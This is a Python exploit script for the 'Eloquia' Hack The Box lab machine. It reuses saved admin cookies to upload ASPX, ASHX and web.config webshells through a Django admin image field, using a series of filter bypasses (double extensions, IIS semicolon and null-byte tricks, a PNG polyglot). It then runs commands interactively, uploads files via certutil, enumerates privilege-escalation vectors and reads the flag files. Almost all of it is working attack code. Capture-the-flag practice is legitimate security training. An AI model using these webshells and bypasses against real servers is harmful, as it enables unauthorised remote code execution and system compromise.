#!/usr/bin/env python3
"""
rce_exploit.py - Webshell Upload and RCE for Eloquia HTB
=========================================================

Exploits file upload vulnerability in Django admin Article model.
Uploads ASPX webshell and provides command execution.

Prerequisites:
- Admin cookies in tmp/admin_cookies.txt (from lab_exploit.py)
- Target is Windows IIS server

Usage:
    python3 rce_exploit.py                    # Full attack chain
    python3 rce_exploit.py --upload-only      # Just upload webshell
    python3 rce_exploit.py --shell            # Interactive shell mode
    python3 rce_exploit.py --cmd "whoami"     # Single command
    python3 rce_exploit.py --get-flags        # Find and display flags
"""

import requests
import argparse
import random
import string
import sys
import os
import re
from io import BytesIO
from urllib.parse import quote

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TMP_DIR = os.path.join(SCRIPT_DIR, "tmp")

TARGET = "http://eloquia.htb"
ADMIN_ARTICLE_ADD = f"{TARGET}/accounts/admin/Eloquia/article/add/"
STATIC_PATH = "/static/assets/images/blog/"

# ANSI Colors
class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    X = '\033[0m'

def success(msg): print(f"{C.G}[+]{C.X} {msg}")
def error(msg): print(f"{C.R}[-]{C.X} {msg}")
def info(msg): print(f"{C.C}[*]{C.X} {msg}")
def warn(msg): print(f"{C.Y}[!]{C.X} {msg}")

# =============================================================================
# WEBSHELL PAYLOADS
# =============================================================================

# Minimal ASPX webshell - command execution via 'c' parameter
ASPX_SHELL = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string c = Request["c"];
if (c != null) {
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + c;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    string output = p.StandardOutput.ReadToEnd();
    output += p.StandardError.ReadToEnd();
    Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
}
%>
'''

# Alternative: ASHX handler (sometimes bypasses filters)
ASHX_SHELL = '''<%@ WebHandler Language="C#" Class="Shell" %>
using System;
using System.Web;
using System.Diagnostics;

public class Shell : IHttpHandler {
    public void ProcessRequest(HttpContext ctx) {
        string c = ctx.Request["c"];
        if (c != null) {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            ctx.Response.Write(p.StandardOutput.ReadToEnd());
        }
    }
    public bool IsReusable { get { return false; } }
}
'''

# Web.config approach - executes via IIS handler mapping
WEBCONFIG_SHELL = '''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
Response.Write(eval(Request("c")))
%>
-->
'''

# =============================================================================
# SESSION MANAGEMENT
# =============================================================================

def load_admin_session():
    """Load admin session from saved cookies"""
    cookie_file = os.path.join(TMP_DIR, "admin_cookies.txt")
    if not os.path.exists(cookie_file):
        error(f"Admin cookies not found: {cookie_file}")
        error("Run lab_exploit.py first to get admin access")
        return None

    session = requests.Session()
    try:
        with open(cookie_file) as f:
            for line in f:
                line = line.strip()
                if '=' in line:
                    name, value = line.split('=', 1)
                    session.cookies.set(name, value, domain='eloquia.htb')

        # Verify session
        resp = session.get(f"{TARGET}/accounts/admin/")
        if 'Log in' in resp.text or resp.status_code == 302:
            error("Admin session expired or invalid")
            return None

        success("Admin session loaded successfully")
        return session
    except Exception as e:
        error(f"Failed to load session: {e}")
        return None

def get_csrf(session, url):
    """Get CSRF token from a page"""
    resp = session.get(url)
    match = re.search(r'csrfmiddlewaretoken["\'\s]+value=["\']([^"\']+)', resp.text)
    if match:
        return match.group(1)
    match = re.search(r'csrftoken=([^;]+)', resp.headers.get('Set-Cookie', ''))
    if match:
        return match.group(1)
    return session.cookies.get('csrftoken')

# =============================================================================
# WEBSHELL UPLOAD
# =============================================================================

def create_dummy_image():
    """Create a minimal valid PNG to bypass image validation"""
    # Minimal 1x1 red PNG
    png_header = bytes([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,  # PNG signature
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,  # IHDR chunk
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,  # 1x1 dimensions
        0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,  # bit depth, color type
        0xDE, 0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41,  # IDAT chunk
        0x54, 0x08, 0xD7, 0x63, 0xF8, 0xFF, 0xFF, 0x3F,
        0x00, 0x05, 0xFE, 0x02, 0xFE, 0xDC, 0xCC, 0x59,
        0xE7, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E,  # IEND chunk
        0x44, 0xAE, 0x42, 0x60, 0x82
    ])
    return png_header

def try_upload_shell(session, filename, content, content_type='application/octet-stream'):
    """Attempt to upload a file via Article banner field"""
    info(f"Trying upload: {filename}")

    csrf = get_csrf(session, ADMIN_ARTICLE_ADD)
    if not csrf:
        error("Could not get CSRF token")
        return None

    # Generate random title
    title = f"Update {''.join(random.choices(string.ascii_lowercase, k=6))}"

    # Prepare multipart form data
    files = {
        'banner': (filename, content, content_type)
    }

    data = {
        'csrfmiddlewaretoken': csrf,
        'title': title,
        'content': '<p>System update</p>',
        'author': '1',  # admin user ID
        '_save': 'Save'
    }

    try:
        resp = session.post(
            ADMIN_ARTICLE_ADD,
            data=data,
            files=files,
            headers={'Referer': ADMIN_ARTICLE_ADD},
            allow_redirects=False
        )

        # Check if upload succeeded (redirect to article list)
        if resp.status_code == 302:
            success(f"Upload succeeded: {filename}")
            # Try to access the uploaded file
            shell_url = f"{TARGET}{STATIC_PATH}{filename}"
            return shell_url
        else:
            # Check for error message
            if 'errorlist' in resp.text:
                error_match = re.search(r'<ul class="errorlist">(.*?)</ul>', resp.text, re.DOTALL)
                if error_match:
                    warn(f"Upload error: {error_match.group(1)[:100]}")
            else:
                warn(f"Upload returned status {resp.status_code}")
            return None

    except Exception as e:
        error(f"Upload failed: {e}")
        return None

def upload_webshell(session):
    """Try multiple techniques to upload a webshell"""
    print(f"\n{C.B}{C.BOLD}--- WEBSHELL UPLOAD ---{C.X}")

    # Techniques to try (in order of likelihood)
    attempts = [
        # Direct ASPX upload
        ("shell.aspx", ASPX_SHELL.encode(), "text/plain"),

        # Double extension tricks
        ("shell.aspx.png", ASPX_SHELL.encode(), "image/png"),
        ("shell.png.aspx", ASPX_SHELL.encode(), "image/png"),
        ("shell.aspx.jpg", ASPX_SHELL.encode(), "image/jpeg"),
        ("shell.aspx;.jpg", ASPX_SHELL.encode(), "image/jpeg"),  # IIS semicolon trick

        # Alternative handlers
        ("shell.ashx", ASHX_SHELL.encode(), "text/plain"),
        ("shell.asmx", ASPX_SHELL.encode(), "text/plain"),

        # Null byte (old IIS versions)
        ("shell.aspx%00.jpg", ASPX_SHELL.encode(), "image/jpeg"),

        # Web.config injection
        ("web.config", WEBCONFIG_SHELL.encode(), "text/xml"),

        # Case variations
        ("shell.AsPx", ASPX_SHELL.encode(), "text/plain"),
        ("shell.ASPX", ASPX_SHELL.encode(), "text/plain"),

        # Polyglot (valid image + ASPX)
        ("shell.aspx", create_dummy_image() + b"\n" + ASPX_SHELL.encode(), "image/png"),
    ]

    for filename, content, ctype in attempts:
        shell_url = try_upload_shell(session, filename, content, ctype)
        if shell_url:
            # Verify the shell is accessible and executable
            if verify_shell(session, shell_url):
                return shell_url
            else:
                warn(f"Uploaded but not executable: {shell_url}")

    error("All upload attempts failed")
    return None

def verify_shell(session, shell_url):
    """Verify webshell is accessible and executable"""
    info(f"Verifying shell at: {shell_url}")

    try:
        # Try to execute a simple command
        test_url = f"{shell_url}?c=echo+SHELL_OK"
        resp = session.get(test_url, timeout=10)

        if 'SHELL_OK' in resp.text:
            success("Webshell is working!")
            return True
        elif resp.status_code == 200:
            warn("File accessible but command not executed")
            print(f"  Response: {resp.text[:200]}")
            return False
        else:
            warn(f"Shell returned status {resp.status_code}")
            return False
    except Exception as e:
        error(f"Shell verification failed: {e}")
        return False

# =============================================================================
# COMMAND EXECUTION
# =============================================================================

def execute_command(session, shell_url, cmd):
    """Execute a command via the webshell"""
    try:
        url = f"{shell_url}?c={quote(cmd)}"
        resp = session.get(url, timeout=30)

        # Extract output from <pre> tags
        match = re.search(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
        if match:
            return match.group(1).strip()
        return resp.text.strip()
    except Exception as e:
        return f"Error: {e}"

def interactive_shell(session, shell_url):
    """Interactive shell mode"""
    print(f"\n{C.G}{C.BOLD}--- INTERACTIVE SHELL ---{C.X}")
    print(f"Target: {shell_url}")
    print(f"Type 'exit' to quit, 'upload <local> <remote>' to upload files")
    print()

    # Get initial info
    whoami = execute_command(session, shell_url, "whoami")
    hostname = execute_command(session, shell_url, "hostname")
    print(f"{C.C}[{hostname}\\{whoami}]{C.X}")

    while True:
        try:
            cmd = input(f"{C.Y}>{C.X} ").strip()

            if not cmd:
                continue
            elif cmd.lower() == 'exit':
                break
            elif cmd.lower().startswith('upload '):
                # File upload functionality
                parts = cmd.split(' ', 2)
                if len(parts) == 3:
                    upload_file(session, shell_url, parts[1], parts[2])
                else:
                    print("Usage: upload <local_file> <remote_path>")
            else:
                output = execute_command(session, shell_url, cmd)
                print(output)

        except KeyboardInterrupt:
            print("\nUse 'exit' to quit")
        except EOFError:
            break

def upload_file(session, shell_url, local_path, remote_path):
    """Upload a file to the target via webshell"""
    if not os.path.exists(local_path):
        error(f"Local file not found: {local_path}")
        return

    with open(local_path, 'rb') as f:
        content = f.read()

    # Base64 encode and use certutil to decode on Windows
    import base64
    b64_content = base64.b64encode(content).decode()

    # Write base64 to temp file, decode with certutil
    temp_file = "C:\\Windows\\Temp\\upload.b64"

    # Write in chunks to avoid command line length limits
    chunk_size = 1000
    for i in range(0, len(b64_content), chunk_size):
        chunk = b64_content[i:i+chunk_size]
        op = ">" if i == 0 else ">>"
        cmd = f'echo {chunk}{op}"{temp_file}"'
        execute_command(session, shell_url, cmd)

    # Decode with certutil
    cmd = f'certutil -decode "{temp_file}" "{remote_path}"'
    result = execute_command(session, shell_url, cmd)

    # Cleanup
    execute_command(session, shell_url, f'del "{temp_file}"')

    if 'successfully' in result.lower():
        success(f"Uploaded: {remote_path}")
    else:
        warn(f"Upload result: {result}")

# =============================================================================
# FLAG RETRIEVAL
# =============================================================================

def get_flags(session, shell_url):
    """Search for and retrieve user and root flags"""
    print(f"\n{C.B}{C.BOLD}--- FLAG RETRIEVAL ---{C.X}")

    # Common flag locations on Windows HTB
    flag_locations = [
        ("User Flag", [
            r"C:\Users\*\Desktop\user.txt",
            r"C:\Users\*\user.txt",
        ]),
        ("Root Flag", [
            r"C:\Users\Administrator\Desktop\root.txt",
            r"C:\Users\Administrator\root.txt",
        ])
    ]

    for flag_name, paths in flag_locations:
        info(f"Searching for {flag_name}...")

        for path in paths:
            # Use dir to find files matching pattern
            if '*' in path:
                dir_cmd = f'dir /s /b "{path}" 2>nul'
                result = execute_command(session, shell_url, dir_cmd)
                if result and 'File Not Found' not in result:
                    for found_path in result.strip().split('\n'):
                        if found_path.strip():
                            flag_content = execute_command(session, shell_url, f'type "{found_path.strip()}"')
                            if flag_content and 'cannot find' not in flag_content.lower():
                                print(f"\n{C.G}{C.BOLD}=== {flag_name} ==={C.X}")
                                print(f"Path: {found_path.strip()}")
                                print(f"{C.G}{flag_content}{C.X}\n")
                                break
            else:
                flag_content = execute_command(session, shell_url, f'type "{path}"')
                if flag_content and 'cannot find' not in flag_content.lower():
                    print(f"\n{C.G}{C.BOLD}=== {flag_name} ==={C.X}")
                    print(f"Path: {path}")
                    print(f"{C.G}{flag_content}{C.X}\n")
                    break

def enumerate_privesc(session, shell_url):
    """Enumerate privilege escalation vectors"""
    print(f"\n{C.B}{C.BOLD}--- PRIVILEGE ESCALATION ENUMERATION ---{C.X}")

    commands = [
        ("Current User", "whoami"),
        ("User Privileges", "whoami /priv"),
        ("User Groups", "whoami /groups"),
        ("System Info", "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\""),
        ("Network Interfaces", "ipconfig | findstr IPv4"),
        ("Local Users", "net user"),
        ("Local Admins", "net localgroup administrators"),
        ("Running Processes", "tasklist /SVC | findstr /V \"svchost\""),
        ("Scheduled Tasks", "schtasks /query /fo LIST | findstr TaskName"),
        ("Installed Programs", "wmic product get name,version 2>nul | findstr /V \"^$\""),
    ]

    for name, cmd in commands:
        info(name)
        output = execute_command(session, shell_url, cmd)
        if output:
            # Indent output
            for line in output.split('\n')[:10]:  # Limit output
                print(f"  {line}")
            if output.count('\n') > 10:
                print(f"  ... ({output.count(chr(10))-10} more lines)")
        print()

# =============================================================================
# MAIN
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='Eloquia HTB - Webshell Upload and RCE',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 rce_exploit.py                    # Full attack chain
  python3 rce_exploit.py --upload-only      # Just upload webshell
  python3 rce_exploit.py --shell            # Interactive shell mode
  python3 rce_exploit.py --cmd "whoami"     # Single command
  python3 rce_exploit.py --get-flags        # Find and display flags
  python3 rce_exploit.py --enum             # Enumerate privesc vectors
        """
    )

    parser.add_argument('--upload-only', action='store_true',
                        help='Only upload webshell, do not execute commands')
    parser.add_argument('--shell', action='store_true',
                        help='Interactive shell mode')
    parser.add_argument('--cmd', type=str,
                        help='Execute single command')
    parser.add_argument('--get-flags', action='store_true',
                        help='Search for and display flags')
    parser.add_argument('--enum', action='store_true',
                        help='Enumerate privilege escalation vectors')
    parser.add_argument('--shell-url', type=str,
                        help='Use existing webshell URL instead of uploading')

    args = parser.parse_args()

    print(f"""
{C.C}{C.BOLD}ELOQUIA RCE EXPLOIT{C.X}
{C.C}{'='*40}{C.X}
  Target: {TARGET}
  Method: ASPX Webshell Upload
{C.C}{'='*40}{C.X}
""")

    # Load admin session
    session = load_admin_session()
    if not session:
        sys.exit(1)

    # Get or upload webshell
    if args.shell_url:
        shell_url = args.shell_url
        info(f"Using provided shell URL: {shell_url}")
    else:
        shell_url = upload_webshell(session)
        if not shell_url:
            error("Failed to upload webshell")
            warn("Try SQL Explorer ATTACH DATABASE method as fallback")
            sys.exit(1)

    # Save shell URL for future use
    shell_url_file = os.path.join(TMP_DIR, "shell_url.txt")
    with open(shell_url_file, "w") as f:
        f.write(shell_url)
    success(f"Shell URL saved to: {shell_url_file}")

    if args.upload_only:
        return

    # Execute based on mode
    if args.cmd:
        output = execute_command(session, shell_url, args.cmd)
        print(output)
    elif args.get_flags:
        get_flags(session, shell_url)
    elif args.enum:
        enumerate_privesc(session, shell_url)
    elif args.shell:
        interactive_shell(session, shell_url)
    else:
        # Full attack chain
        print(f"\n{C.G}{C.BOLD}=== INITIAL ACCESS ACHIEVED ==={C.X}")

        # Show basic info
        whoami = execute_command(session, shell_url, "whoami")
        print(f"  Running as: {whoami}")

        # Enumerate
        enumerate_privesc(session, shell_url)

        # Get flags
        get_flags(session, shell_url)

        # Offer interactive shell
        print(f"\n{C.Y}Enter interactive shell? (y/n): {C.X}", end='')
        if input().strip().lower() == 'y':
            interactive_shell(session, shell_url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.X}")
        sys.exit(1)
